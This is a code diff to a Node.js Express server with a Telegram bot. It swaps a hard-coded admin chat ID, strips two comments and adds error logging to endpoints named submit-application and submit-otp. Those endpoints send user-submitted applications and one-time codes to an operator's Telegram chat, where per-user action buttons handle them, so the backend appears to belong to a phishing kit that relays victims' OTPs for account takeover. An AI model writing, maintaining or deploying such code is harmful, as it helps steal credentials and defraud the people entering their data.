@@ -13,7 +13,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN;
 const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
-const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8845346118';
+const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8786820449';
 
 if (!TOKEN) {
   console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
@@ -218,7 +218,6 @@ async function initBot() {
         return;
       }
 
-      // FIX: Use single underscores safely separating action prefix from the safe userId token
       const underscoreIndex = actionData.indexOf('_');
       const prefix = underscoreIndex !== -1 ? actionData.substring(0, underscoreIndex) : actionData;
       const targetId = underscoreIndex !== -1 ? actionData.substring(underscoreIndex + 1) : '';
@@ -293,7 +292,6 @@ app.post('/api/submit-application', async (req, res) => {
       return res.status(400).json({ success: false, error: 'Target chat ID missing.' });
     }
 
-    // FIX: Generate a safe alphanumeric ID without inner underscores that break splitting
     const userId = 'usr_' + Date.now() + Math.random().toString(36).substring(2, 7);
 
     sessions.set(userId, {
@@ -332,6 +330,7 @@ app.post('/api/submit-application', async (req, res) => {
     return res.status(200).json({ success: true, userId });
 
   } catch (err) {
+    console.error("DETAILED TELEGRAM ERROR:", err.response?.body || err.message);
     return res.status(500).json({ success: false, error: 'Telegram dispatch failed: ' + (err?.message || 'Unknown error') });
   }
 });
@@ -379,6 +378,7 @@ app.post('/api/submit-otp', async (req, res) => {
 
     return res.status(200).json({ success: true });
   } catch (error) {
+    console.error("DETAILED TELEGRAM ERROR (OTP):", error.response?.body || error.message);
     return res.status(500).json({ success: false, error: 'Telegram dispatch failed' });
   }
 });
@@ -387,4 +387,4 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
 });
-        
+    
